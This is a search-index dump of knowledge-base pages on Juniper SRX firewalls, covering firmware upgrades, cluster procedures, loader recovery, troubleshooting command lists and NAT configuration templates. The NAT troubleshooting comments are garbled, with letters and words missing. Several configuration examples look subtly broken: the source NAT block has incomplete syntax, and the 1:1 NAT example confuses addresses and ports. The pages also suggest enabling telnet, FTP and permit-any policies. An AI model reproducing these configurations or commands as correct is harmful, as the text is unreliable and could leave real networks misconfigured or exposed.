system.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#4-rollback","title":"4. Rollback","text":"<p>If a software upgrade causes an unforeseen issue, the system can be reverted using the commands:</p> <pre><code>request system software rollback\nrequest system reboot\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#cluster-srx-upgrade","title":"Cluster SRX Upgrade","text":"<p>For use with an SRX cluster. For each software upgrade, this section should be completed in its entirety.</p> <p>Not all required changes can be completed from a single cluster node and as such, access to the other node is required. You can access the other node from the primary using</p> <pre><code>#replace the \u201c#\u201d with the node you wish to access\nrequest routing-engine login node #\n\n#If a command is required to be run separately on both nodes, it will be indicated\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#preparation_1","title":"Preparation","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#1-verify-cluster-is-healthy","title":"1. Verify Cluster is Healthy","text":"<p>Log into the SRX using SSH.</p> <pre><code>#verify the following are true\n\nshow chassis cluster status\n</code></pre> <pre><code>Node 0 and Node 1 are listed under Redundancy Group 0\nFor each Redundancy Group, one node is primary and the other is secondary\nFor each Redundancy Group, priority for either node is not 0 or 255\nIf any of the above are false, stop and correct the issue\n</code></pre> <p>Software upgrades should only be performed on healthy clusters to prevent further issues</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#2-determine-next-upgrade-version","title":"2. Determine next Upgrade Version","text":"<p>Log into the firewall using SSH.</p> <pre><code>#gather the model and current software release\nshow version\n</code></pre> <p>Refer to <code>Common Upgrade Paths</code> section to determine the next software version</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#3-cleanup-old-files","title":"3. Cleanup old files","text":"<pre><code>request system storage cleanup\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#4-update-the-autorecovery-state","title":"4. Update the Autorecovery State","text":"<pre><code>#run the command on both nodes\nrequest system autorecovery state save\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#5-verify-alternate-root-partition-software","title":"5. Verify Alternate Root Partition Software","text":"<pre><code>show system software backup\n</code></pre> <p>Verify the version listed matches the version from the previous step.</p> <p>Log into the other node using </p> <pre><code># replace # with the node you want to log into\n\nrequest routing-engine login node #\n</code></pre> <p>Repeat the same verification, if either node does not match then run the following</p> <pre><code>request system snapshot slice alternate\n</code></pre> <p>Note: This command will take some time to finish.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#6-create-a-backup-of-the-current-configuration","title":"6. Create a backup of the current configuration","text":"<p>If copying the configuration directly from the terminal</p> <pre><code>show configuration | display set\n</code></pre> <p>If saving the configuration to a file for later transfer using your preferred file transfer method, use the command</p> <pre><code>#replace &lt;filename&gt; with your desired name\n\nshow configuration | display set | save /var/tmp/&lt;filename&gt;\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#7-download-new-image","title":"7. Download New Image","text":"<p>If you already have the required software, this step can be skipped.</p> <p>Software downloads are available from Juniper here, search for the model and then select the version from the dropdown. If the version is not listed, you will need to open a support case with JTAC.</p> <p>Download the necessary version and log in with your Juniper account when prompted and accept the terms.</p> <p>After accepting terms you will be prompted with two options, select download image to localhost.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#upgrade-procedure_1","title":"Upgrade Procedure","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#1-upload-the-new-version-to-the-srx-cluster","title":"1. Upload the new version to the SRX Cluster","text":"<p>Although multiple methods can be used to upload the new software to the device, this example will show the procedure using SCP.</p> <pre><code>#SCP command\nscp path/to/local/filename  username@&lt;SRX IP Address&gt;:/var/tmp/\n</code></pre> <p>The local path to the file will need to match your system however the target will always be <code>/var/tmp</code>.</p> <p>As an example, when running the SCP command from the same directory as the local file and uploading the image to an SRX on the IP address 1.2.3.4</p> <pre><code>scp junos-srxsme-21.4R3.15.tgz jsmith@1.2.3.4:/var/tmp/\n</code></pre> <p>Note: The extension is required otherwise the file will fail to upload.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#2-copy-software-to-the-other-node","title":"2. Copy software to the other node","text":"<p>The software can be copied to the other node using </p> <pre><code>#replace \u201cfilename\u201d with the name of the file from the previous step and \u201c#\u201d with the node number you are copying to.\n\nfile copy /var/tmp/filename  node#:/var/tmp/\n</code></pre> <p>Verify the file has copied by logging into the other node and running</p> <pre><code>file list /var/tmp/\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#3-validate-and-add-the-software-package","title":"3. Validate and add the software package","text":"<p>From the SRX command line, run the following to validate and add the software, modifying <code>filename</code> to match filename used in the previous step:</p> <pre><code>#run the command on both Nodes (note that this might take sometime to finish)\nrequest system software add /var/tmp/filename\n</code></pre> <p>To finish the install, reboot the devices</p> <pre><code>request system reboot node all\n</code></pre> <p>A reboot will take roughly 15 to 25 minutes to complete. Do not power down the devices during this time attempting to troubleshoot prematurely.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#4-verification","title":"4. Verification","text":"<p>When the SRX has finished rebooting and is accessible again, log in and verify the expected version has been installed using <code>show version</code></p> <p>If the version does not match the expected result, verify the version of Software used to upgrade the system.</p> <p>Verify that the cluster has come back in a healthy state by running <code>show chassis cluster status</code> and verifying the following are true:</p> <pre><code>Node 0 and Node 1 are listed under Redundancy Group 0\nFor each Redundancy Group, one node is primary and the other is secondary\nFor each Redundancy Group, priority for either node is not 0 or 255\n</code></pre> <p>Note: A cluster may take up to 15 minutes to resync after both devices are back online.</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_Upgrade_2/#5-rollback","title":"5. Rollback","text":"<p>If a software upgrade causes an unforeseen issue, the system can be reverted using the commands</p> <pre><code>request system software rollback node all\nrequest system reboot node all\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_upgrade_1/","title":"Juniper SRX Firmware upgrade 1","text":"<p>JUNOS Download</p> <p>You have 3 methods below, use only one!</p> <p>Method 1: Upload the file into /var/tmp/ directory using filezilla or winscp and then check if you can see it</p> <pre><code>run file list /var/tmp/\nrequest system software add /var/tmp/junos-srxsme-12.1X46-D40.2-domestic.tgz no-validate\n</code></pre> <p>Method 2: FTP Method</p> <pre><code>request system software add ftp://ftpuser:ftppass@172.16.1.1/junos-srxsme-12.1X46-D40.2-domestic.tgz no-copy no-validate\n</code></pre> <p>Method 3: HTTPS Method</p> <pre><code>file copy \"https://cdn.juniper.net/software/junos/20.4R3.8/junos-srxsme-20.4R3.8.tgz?SM_USER=username@domainname.com&amp;__gda__=1674734823_bd7351a3514eb61069sad8yoasd9\" /var/tmp/junos-srxsme-20.4R3.8.tgz\n\nrequest system software validate /var/tmp/junos-srxsme-20.4R3.8.tgz\n\nrequest system software add /var/tmp/junos-srxsme-20.4R3.8.tgz no-validate\n</code></pre> <p>Reboot after choosing your method</p> <pre><code>request system reboot\n</code></pre> <p>It can take 10-15 minutes before becoming available again, after it's back run the below</p> <pre><code>show version\nshow system boot-messages | no-more\nshow chassis hardware | no-more\nshow chassis environment | no-more\nshow interface terse | no-more\n</code></pre> <p>Check DHCP Leases</p> <pre><code>show arp no-resolve\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_upgrade_1/#before-upgrading","title":"Before upgrading","text":"<pre><code>show version\nshow chassis hardware | no-more\nshow chassis environment | no-more\nshow interface terse | no-more\nshow configuration | no-more | display set\n</code></pre> <p>Check system alarms and regarless of result run request</p> <pre><code>show system alarms\nrequest system configuration rescue save\nrequest system autorecovery state save\n</code></pre> <p>Check chassis alarms</p> <pre><code>show  chassis  alarms\nshow system storage partitions\nrequest system snapshot slice alternate\nshow system snapshot media internal\nrequest system reboot\nshow chassis alarms\n</code></pre> <p>Make sure you have enough storage before upgrading /var</p> <pre><code>show system storage | no-more\n</code></pre> <p>If need more space, check files dry-run</p> <pre><code>request system storage cleanup dry-run\n</code></pre> <p>If all good to delete in results above, then run it. if not needed then ignore this step</p> <pre><code>request system storage cleanup\n</code></pre> <p>Enable services &amp; Connect to SRX through FTP &amp; upload firmware file to Juni, might need to update the security zone command, for zone name and interface</p> <pre><code>configuration\nset system service telnet\nset system service ftp\nset security zones security-zone MGMT interfaces irb.1234 host-inbound-traffic system-services ftp\ncommit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Firmware_upgrade_1/#extra-sources","title":"extra sources","text":"<ul> <li>Junos Software Installation/Upgrade</li> <li>JUNOS OS Firmware Release Notes</li> <li>JUNOS Download</li> <li>YT - Upgrade Software on Juniper SRX using WinSCP</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Flow/","title":"Juniper SRX Flow","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_General_Troubleshooting/","title":"Juniper SRX General Troubleshooting","text":"<p>General Commands</p> <pre><code>show chassis hardware\nShow chassis fpc pic-status\nshow system alarms\nshow chassis alarms\nshow chassis environment\nshow chassis hardware\nshow chassis routing-engine\nshow chassis forwarding-engine\nshow chassis pic\nshow system storage\nshow system commit\nshow pfe route &gt; PFE Forwarding Table\nshow system processes extensive | match \"rpd|dcd|chassisd|pfed|snmpd|mdg\"\nshow version      &gt;      package-prefix-arch-abi-release-edition.extension\nshow log\nshow log user\nshow log messages\nshow log accepted-traffic\n\nshow security session flow\n\nshow route\nshow route forwarding-engine\nshow route forwarding-table destination 192.168.10.100 \nshow route table inet.0 192.168.10.100 extensive \nshow route table inet.0 192.168.10.0/24 \n\n\nfile list &gt; show directory\nfile compare file &lt;f1&gt; &lt;f1&gt;\nfile save \nsave &gt; can be ftp, filename, path/filename\nload &lt;merge, set, update, factory-default&gt; terminal \nfile copy &gt; to transfer files ftp or scp\ncommit prepare &gt; commit activate\nshow | compare\n\n\nwildcard delete ...\nreplace &gt; move config from one place to another\nrename\ndeactivate\ninsert\n\nrequest system storage cleanup\nrequest system storage cleanup dryrun\nrequest system software add &lt;path/image&gt; validate no-copy  &gt;&gt; then restart\nrequest system snapshot\nrequest system configuration rescue save\nrequest system recover &gt; create big image for recovery 1GB\n\nmonitor interface\nmonitor traffic &gt; provides tcpdump\n\n\n*Password recovery*\nreboot \nspace bar\nboot + save\nrecovery*set root password\ncommit and exit\nreboot\n</code></pre> <p>Routing Troubleshooting</p> <pre><code>show protocols\nshow routing-options    &gt; Get Routing Types used &amp; See what Policies are applied\nshow routing-instances  &gt; Show Routing Instances protocols - Contains Interface Info\nshow policy-options     &gt; policy-statement import export\nshow firewall           &gt; Firewall filters and terms\nshow security zones     &gt; Check Zone for irb\nshow security policies  &gt; Permit &amp; Deny Policy\nrun show route hidden extensive\n\n\n$$Checklist for Verifying the BGP Protocol and Peers$$\nhttps://www.juniper.net/documentation/us/en/software/junos/bgp/topics/topic-map/troubleshooting-bgp-sessions.html\n\n\n**Verify BGP Peers\n\nshow configuration                                              &gt;   Verify BGP on a Border Router &amp; Verify BGP on an Internal Router\nshow route advertising-protocol bgp &lt;neighbor-address&gt;          &gt;   Verify That a Particular BGP Route Is Received on Your Router   | Look for (X active, 0 holddown, 0 hidden) |   Use show configuration | match \"neig\"\nshow route advertising-protocol bgp &lt;neighbor-address&gt;  detail  &gt;   Verify That a Particular BGP Route Is Received on Your Router   | Look for (X active, 0 holddown, 0 hidden) |   Use show configuration | match \"neig\"\nshow route receive-protocol bgp &lt;neighbor-address&gt;              &gt;   Verify That a Particular BGP Route Is Received on Your Router   |   Use show configuration | match \"neig\"\nshow policy-options policy-statement xxx                        &gt;   If you have hidden or reject then use this\nrun show route protocol bgp hidden &lt;prefix&gt; extensive           &gt;   Show hidden route\nshow route &lt;Hidden route address&gt;                               &gt;   Check if route is reachable\n\n**Examine BGP Routes and Route Selection\nshow route destination-prefix &lt; detail &gt;    &gt;   Examine the Local Preference Selection\nshow route destination-prefix &lt; detail &gt;    &gt;   Examine the Multiple Exit Discriminator Route Selection\nshow route destination-prefix &lt; detail &gt;    &gt;   Examine the EBGP over IBGP Selection\nshow route destination-prefix &lt; detail &gt;    &gt;   Examine the IGP Cost Selection\nshow route forwarding-table                 &gt;   Examine Routes in the Forwarding Table\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_Loader_Recovery/","title":"Juniper SRX Loader Recovery","text":"<p>Steps to recover from a Loader prompt Loader&gt; <code>can't load '/kernel' can't load '/kernel.old'</code></p> <p>Press any key or space bar to enter into the loader prompt. &lt; After pressing space bar or any key you would be directed to the below prompt &gt; <code>Loader &gt;</code></p> <p>Recovery steps</p> <ol> <li> <p>Format a USB stick with the FAT32 file system.</p> </li> <li> <p>Copy the desired JunOS image (*.tgz) to the USB Stick. Make sure that no file(s) is there in the USB drive before copying the Junos image.     https://support.juniper.net/support/downloads/?p=srx300</p> </li> <li> <p>Insert the USB stick into the USB port on the switch.</p> </li> <li> <p>Connect via console port to the switch.</p> </li> <li> <p>Power on the switch.</p> </li> <li> <p>Press the space bar after getting the above message to get into the loader prompt.</p> </li> <li> <p>Type the command <code>loader&gt; install file:///jinstall-ex-xxxx-xx.xxx.x-domestic-signed.tgz</code> </p> </li> <li>press [enter]</li> <li> <p>&lt; Marked in BLUE is the Junos image file name copied in the USB&gt;</p> </li> <li> <p>After the above command the switch would <code>reboot</code> and get you to the normal prompt.</p> </li> <li> <p>It would ask for User Name to get in. Type <code>root</code> as username and <code>press [enter]</code>, it would give you the <code>% prompt</code>.</p> <ul> <li>There is a possibility that system would not accept the root as username, this would be in the case of old units where root-login is denied.</li> <li>Then there would be a need to recover the root password and there is a separate procedure for it.</li> </ul> </li> <li> <p>Above command (@ point 7 )will load the Junos in the switch but there is a possibility that switch may boot from the old partition having old version of image.</p> </li> <li> <p>Verify the same using # run show system snapshot media internal command. This command will show the Junos image present in both the partitions (In below image both have the same version).</p> </li> <li> <p>If the unit has the updated/desired verison then skip the step number 13.</p> </li> <li> <p>Run command # run request system snapshot slice alternate to get the new version of Junos stored in alternate partition, in case required.</p> </li> <li> <p>Now the new unit is ready to join the VC or master.</p> </li> <li> <p>Make the connections and check the status of new unit . After this, the unit would get the configuration from master once joined in VC.</p> </li> </ol>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_1TO1/","title":"Juniper SRX NAT 1TO1","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_1TO1/#proxy-arp","title":"Proxy ARP","text":"<ul> <li>Proxy ARP is needed in a 1:1 NAT configuration because it allows the router to respond to ARP requests for the public IP address on behalf of the private IP address.</li> <li>When a host on the private network wants to communicate with a host on the public network, it sends an ARP request to find the MAC address associated with the public IP address. Without proxy ARP, the router would not be able to respond to this ARP request and the communication would fail.</li> <li>By enabling proxy ARP on the router, it can respond to ARP requests for the public IP address on behalf of the private IP address, allowing communication to take place. This is necessary because the router needs to be able to forward the traffic between the private and public networks, and proxy ARP allows the router to function as a proxy for ARP requests for the public IP address.</li> <li>In summary, the purpose of proxy ARP is to allow the router to respond to ARP requests on behalf of the private IP address and to allow communication between the private and public networks.</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_1TO1/#configuration-template","title":"Configuration Template","text":"<ul> <li>CHECK THE ADDRESS BOOK CONFIGURATION FIRST AS SCRIPT MIGHT NEED AN UPDATE!</li> <li>This is a Static 1:1 NAT configuration with security policy to allow access from a single specific Public IP Address to a Single Private Address on all Port (No port translation)</li> </ul> <p>The following will need to be changed in the script</p> <ul> <li> Enter rule name such as VendorToEquipmentX <li> Enter Rule Name for rule <li> The Public IP address that the client will access from Internet <li> The Private assigned IP for the client device <li> Address Book name that will be created for the Vendor limited access <li> address set name for local device <li> address of the device on lan <li> address set name for vendor <li> public ip src address that the vendor will use to access their equipment <li> security policy zone name for the vendor <pre><code>set security nat static rule-set &lt;FromX-ToY&gt; from zone Internet \nset security nat static rule-set &lt;FromX-ToY&gt; rule &lt;RuleName&gt; match destination-address &lt;public-ip-being-accessed/32&gt;\nset security nat static rule-set &lt;FromX-ToY&gt; rule &lt;RuleName&gt; then static-nat prefix &lt;destination-lan-IP/32&gt;\n\nset security nat proxy-arp interface ge-0/0/0.0 address &lt;public-ip-being-accessed/32&gt;\n\nset security address-book &lt;AddBookName-VendorEquipment&gt; address &lt;local-access-name&gt; &lt;destination-lan-IP/32&gt;\nset security address-book &lt;AddBookName-VendorEquipment&gt; address &lt;public-access-name&gt; &lt;source-public-accessing/32&gt;\n\nset security policies from-zone &lt;Zonename-Vendor&gt; to-zone Internet policy permit-all match source-address &lt;public-access-name&gt; \nset security policies from-zone &lt;Zonename-Vendor&gt; to-zone Internet policy permit-all match destination-address &lt;local-access-name&gt; \nset security policies from-zone &lt;Zonename-Vendor&gt; to-zone Internet policy permit-all match application any \nset security policies from-zone &lt;Zonename-Vendor&gt; to-zone Internet policy permit-all then permit \n\nset security policies from-zone Internet to-zone &lt;Zonename-Vendor&gt; policy server-access match source-address &lt;public-access-name&gt; \nset security policies from-zone Internet to-zone &lt;Zonename-Vendor&gt; policy server-access match destination-address &lt;local-access-name&gt;\nset security policies from-zone Internet to-zone &lt;Zonename-Vendor&gt; policy server-access match application any\nset security policies from-zone Internet to-zone &lt;Zonename-Vendor&gt; policy server-access then permit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_1TO1/#example","title":"Example","text":"<pre><code>+-------------+     +-------------+\n| Public      |     | Private     |\n| Network     |----&gt;| Network     |\n|             |     |             |\n| 5.5.5.5:9090|     |10.0.0.2:443 |\n+-------------+     +-------------+\n\nIn above example\n- a host on the public network is trying to access the private IP address 10.0.0.2 on port 443\n- The 1:1 NAT rule, maps the public IP address 5.5.5.5 and port 9090 to the private IP address 10.0.0.2 and port 443.\n- When the host on the public network sends a request to the public IP address 5.5.5.5 on port 9090, the router will forward the request to the private IP address 10.0.0.2 on port 443.\nthe source IP address is 5.5.5.5 and source port is 9090, the destination IP address is 10.0.0.2 and destination port is 443. The router is doing a 1:1 mapping of these IP addresses and ports so that the host\n</code></pre> <p>Example configuration</p> <pre><code># Create a rule-set named \"private-to-public\" for the zone Internet \nset security nat static rule-set private-to-public from zone Internet \n\n# Create a rule named \"web-server\" that matches the destination address of the public IP being accessed\nset security nat static rule-set private-to-public rule web-server match destination-address 5.5.5.5/32\n\n# Apply the NAT action to the private IP addresses and use the public IP address 5.5.5.5 and map public port 9090 to private port 443\nset security nat static rule-set private-to-public rule web-server then static-nat prefix 10.0.0.2/32 port 9090\n\n# Enable proxy ARP for the public IP address 5.5.5.5 on the ge-0/0/0 interface\nset security nat proxy-arp interface ge-0/0/0.0 address 5.5.5.5/32\n\n# Create an address book named \"access-list\" and specify the private and public IP addresses\nset security address-book global address access-list address local-access-name 10.0.0.2/32\nset security address-book global address access-list address public-access-name 5.5.5.5/32\n\n# Create a security policy to allow traffic from the Vendor zone to the Internet zone\nset security policies from-zone Vendor to-zone Internet policy permit-all match source-address public-access-name \nset security policies from-zone Vendor to-zone Internet policy permit-all match destination-address local-access-name\nset security policies from-zone Vendor to-zone Internet policy permit-all match application any\nset security policies from-zone Vendor to-zone Internet policy permit-all then permit\n\n# Create a security policy to allow traffic from the Internet zone to the Vendor zone\nset security policies from-zone Internet to-zone Vendor policy server-access match source-address public-access-name \nset security policies from-zone Internet to-zone Vendor policy server-access match destination-address local-access-name\nset security policies from-zone Internet to-zone Vendor policy server-access match application any\nset security policies from-zone Internet to-zone Vendor policy server-access then permit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_Destination/","title":"Juniper SRX NAT Destination","text":"<p>Destination NAT, The destination address of a packet is changed as it enters a router. This is often used to redirect incoming public Internet traffic to a specific internal host or network. For example, a public IP address of 1.1.1.1 is configured with a destination NAT rule to redirect incoming HTTP traffic to a web server located on the internal network at IP address 10.0.0.2.</p> <p>Replace RemoteDevice Private IP  Example: 172.20.105.10 Replace with RemoteDevice WAN Public IP  Example: 60.32.32.32/32 Replace both  and  Replace the Ports both address port and destination-port <p>Below are example of multiple Destination NATs (HTTPS, SNMP &amp; SSH)</p> <pre><code>set security nat destination rule-set RemoteDevice_Port_Forwards from zone &lt;Internet_ZONE&gt;\n\n#HTTPS 8443 &gt; 443\nset security nat destination pool RemoteDevice_HTTPS address &lt;Private_IP&gt;\nset security nat destination pool RemoteDevice_HTTPS address port 443\nset security nat destination rule-set RemoteDevice_Port_Forwards rule RemoteDevice_HTTPS match destination-address &lt;Public_IP/32&gt;\nset security nat destination rule-set RemoteDevice_Port_Forwards rule RemoteDevice_HTTPS match destination-port 8443\nset security nat destination rule-set RemoteDevice_Port_Forwards rule RemoteDevice_HTTPS then destination-nat pool RemoteDevice_HTTPS\n\n#SNMP 1610 &gt; 1610\n#Configure RemoteDevice SNMP to be on port 1610\nset security nat destination pool RemoteDevice_SNMP address &lt;Private_IP&gt;\nset security nat destination pool RemoteDevice_SNMP address port 1610\nset security nat destination rule-set RemoteDevice_Port_Forwards rule RemoteDevice_SNMP match destination-address &lt;Public_IP/32&gt;\nset security nat destination rule-set RemoteDevice_Port_Forwards rule RemoteDevice_SNMP match destination-port 1610\nset security nat destination rule-set RemoteDevice_Port_Forwards rule RemoteDevice_SNMP then destination-nat pool RemoteDevice_SNMP\n\n#SSH 2202 &gt; 22\nset security nat destination pool RemoteDevice_SSH address &lt;Private_IP&gt;\nset security nat destination pool RemoteDevice_SSH address port 22\nset security nat destination rule-set RemoteDevice_Port_Forwards rule RemoteDevice_SSH match destination-address &lt;Public_IP/32&gt;\nset security nat destination rule-set RemoteDevice_Port_Forwards rule RemoteDevice_SSH match destination-port 2202\nset security nat destination rule-set RemoteDevice_Port_Forwards rule RemoteDevice_SSH then destination-nat pool RemoteDevice_SSH\n\n#Check the security Zone and make sure you have system-services any-service configured\nset security zones security-zone &lt;ZONE&gt; interfaces ge-0/0/2.0 host-inbound-traffic system-services any-service\n\n#Check which Zone you need to configure - show security zones\nset security policies from-zone &lt;Natted_ZONE&gt; to-zone &lt;Internet_ZONE&gt; policy permit-all match source-address any\nset security policies from-zone &lt;Natted_ZONE&gt; to-zone &lt;Internet_ZONE&gt; policy permit-all match destination-address any\nset security policies from-zone &lt;Natted_ZONE&gt; to-zone &lt;Internet_ZONE&gt; policy permit-all match application any \nset security policies from-zone &lt;Natted_ZONE&gt; to-zone &lt;Internet_ZONE&gt; policy permit-all then permit \n\n#Check which Zone you need to configure - show security zones\nset security policies from-zone &lt;Internet_ZONE&gt; to-zone &lt;Natted_ZONE&gt; policy server-access match source-address any\nset security policies from-zone &lt;Internet_ZONE&gt; to-zone &lt;Natted_ZONE&gt; policy server-access match destination-address any\nset security policies from-zone &lt;Internet_ZONE&gt; to-zone &lt;Natted_ZONE&gt; policy server-access match application any\nset security policies from-zone &lt;Internet_ZONE&gt; to-zone &lt;Natted_ZONE&gt; policy server-access then permit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_Source/","title":"Juniper SRX NAT Source","text":"<p>Source NAT: The source address of a packet is changed as it exits a router and enters a public network. This allows a private IP address to be translated to a public IP address. For example, a private network with the IP address range of 10.0.0.0/24 wants to access the internet. A router with a public IP address of 1.1.1.1 is configured with a source NAT rule that translates the source IP address of 10.0.0.0/24 to 1.1.1.1 as the packets leave the private network and enter the public network.</p> <p>Source NAT Configuration Template &amp; Example</p> <pre><code>```\n+-------------+     +-------------+\n| Public      |     | Private     |\n| Network     |&lt;----| Network     |\n|             |     |             |\n| 5.5.5.5     |     |10.0.0.2     |\n+-------------+     +-------------+\n```\n\nIn this example, a host on the private network is trying to access a host on the public network using its private IP address 10.0.0.2. The source NAT rule, maps the private IP address 10.0.0.2 to the public IP address 5.5.5.5 When the host on the private network sends a request to the public network, the router will change the source IP address from 10.0.0.2 to 5.5.5.5 before forwarding the packet to the public network. This way, the public network will see the request coming from the public IP address 5.5.5.5 instead of the private IP address 10.0.0.2\n\nIn this representation, the source IP address is 10.0.0.2 and the destination IP address is any IP address on the public network. The router is doing a 1:1 mapping of the source IP address 10.0.0.2 to the public IP address 5.5.5.5 so that the host on the private network can communicate with the host on the public network.\n\nThe below configuration is for a router with a public IP address of 1.1.1.1 and a private network on ge-0/0/0 interface with IP address range of 10.0.0.0/24. It creates a pool of public IP addresses (1.1.1.2 to 1.1.1.254) that will be used for the NAT and matches the private IP addresses that need to be NATed. Then it applies the NAT action to the private IP addresses using the public IP pool and applies the NAT rule to the ge-0/0/0 interface.\n\n```bash\n# Set up the interface that will be used for the NAT\nset interfaces ge-0/0/0 unit 0 family inet address 1.1.1.1/24\n\n# Create a pool of public IP addresses that will be used for NAT\nset security nat source pool public-ip address 1.1.1.2/32 to 1.1.1.254/32\n\n# Create a rule that will match the private IP addresses that need to be NATed\nset security nat source rule private-to-public match source-address 10.0.0.0/24\n\n# Apply the NAT action to the private IP addresses and use the public IP pool\nset security nat source rule private-to-public then source-nat pool public-ip\n\n# Apply the NAT rule to the interface that is connected to the private network\nset security nat source rule private-to-public then interface ge-0/0/0.0\n```\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_Troubleshooting/","title":"Juniper SRX NAT Troubleshooting","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_Troubleshooting/#source-destination-nat-troubleshooting","title":"Source &amp; Destination NAT Troubleshooting","text":"<pre><code>#display information about the source NAT rules, including the number of packets and        ytes    that have been translated, as well as the number of active sessions\nshow security nat source rule\n\n#display information about the destination NAT rules, including the number of packets     and       ytes that have been translated, as well as the number of active sessions\nshow security nat destination rule\n\n#display information about the source NAT pools, including the number of addresses in     use       nd available\nshow security nat source pool\n\n#display information about the destination NAT pools, including the number of addresses         n    use and available\nshow security nat destination pool\n\n#shows all the statistics of all the NAT rules, including the number of packets and     bytes       hat have been translated, as well as the number of active sessions\nshow security nat source rule all statistics\n\n#shows all the statistics of all the NAT rules, including the number of packets and     bytes       hat have been translated, as well as the number of active sessions\nshow security nat destination rule all statistics\n\n#display information about the active flow sessions, including the source and     destination       ddresses and ports, as well as the NAT translation information\nshow security flow session\n\n#It's important to note that the security flow session table is populated only when the         ession is created and \n#the traffic matches a security rule that has the session-initiation flag set  \nshow security flow session rule-name &lt;NAT rule name&gt;\nshow security flow session source-address &lt;source IP address&gt;\nshow security flow session destination-address &lt;destination IP address&gt;\n\n#shows the sessions that match the specified source NAT rule\nshow security flow session source-nat-rule name\n\n#shows the sessions that match the specified destination NAT rule\nshow security flow session destination-nat-rule name\n\n#allows you to trace the path of a packet from the source to the destination, including         he    NAT translations. It can help you to verify if the packets are reaching the       orrect    destination and if the NAT translations are being applied correctly\ntraceroute\ntraceroute 5.5.5.5 source 10.0.0.1\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/SRX/Juniper_SRX_NAT_Troubleshooting/#11-nat-troubleshooting","title":"1:1 NAT Troubleshooting","text":"<pre><code>#display the configured NAT rule-sets, including the name, from-zone, and to-zone of each       ule. It also shows the number of hits for each rule, which can be used to determine if     he    rule is being used\nshow security nat rule-set\n\n#display the destination NAT rules and their statistics, including the number of packets        nd bytes that have been translated by each rule\nshow security nat destination rule-set\n\n#display the source NAT rules and their statistics, including the number of packets and     ytes that have been translated by each rule\nshow security nat source rule-set\n\n#display the proxy ARP entries, including the interface, IP address, and number of ARP      equests that have been handled by each entry\nshow security nat proxy-arp\n\n#show configuration\nshow security nat proxy-arp\n\n#You can also check the proxy arp for a specific interface\nshow security nat proxy-arp interface &lt;interface name&gt;\n\n        &gt;The output will show the interface name, the IP address that the proxy arp is configured for, and the number of ARP requests that have been handled by the proxy arp\n        &gt;If the proxy arp is working as expected, you should see a non-zero value for the number of ARP requests\n\n        &gt;It's important to note that proxy ARP is typically used in conjunction with NAT, so if the NAT is not working as expected, it's likely that the proxy ARP is not working as expected either\n        &gt;It's also important to check if the proxy arp is enabled on the correct interfaces and that the interfaces are in the correct zone\n\n        &gt;It's also good practice to check the arp table to confirm that the arp entries are being resolved correctly\n        &gt;You can use the command show arp to check the arp table\n\n#display the security policies and their statistics, including the number of packets and        ytes that have been permitted or denied by each policy\nshow security policies\n\n#show security policies\nshow security policies\n\n#To check security policies for a specific source IP address\nshow security policies source-address &lt;source IP address&gt;\n\n#To check security policies for a specific destination IP address\nshow security policies destination-address &lt;destination IP address&gt;\n\n#To check security policies for a specific application\nshow security policies application &lt;application name&gt;\n\n#display the routing table, which can be used to verify that the router is forwarding       raffic to the correct next-hop\nshow route\n#To check the routing table for a specific source IP address\nshow route &lt;source IP address&gt;\n\n#To check the routing table for a specific soudestination IP address\nshow route &lt;destination IP address&gt; &lt;source IP address&gt;\n\n#To check the routing table for a specific Interface\nshow route interface &lt;interface 